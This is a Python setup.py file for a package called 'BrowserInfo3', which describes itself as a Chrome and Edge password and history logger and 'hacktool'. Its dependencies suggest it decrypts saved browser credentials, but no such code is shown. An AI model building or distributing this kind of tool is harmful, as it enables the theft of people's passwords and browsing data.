from setuptools import find_packages
from setuptools import setup
Description = "An edge and chrome password, history logger, dont use it illegally. "

Long_Description = f"""
A Chrome and edge Info logger using SQL databases, dont use it illegally as it can be a hacktool.

Copyright x203f-Hacktools
"""
setup(
    name="BrowserInfo3",
    version="0.1",
    author="pyprojects3",
    description=Description,
    long_description_content_type="text/markdown",
    long_description=Long_Description,
    packages=find_packages(),
    license="MIT",
    install_requires=['pywin32',"pycryptodome",'requests'],
    keywords=["Browser","BrowserHistory","SQL",'Chrome','Edge',"Passwords"],
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Microsoft :: Windows",
    ]
)
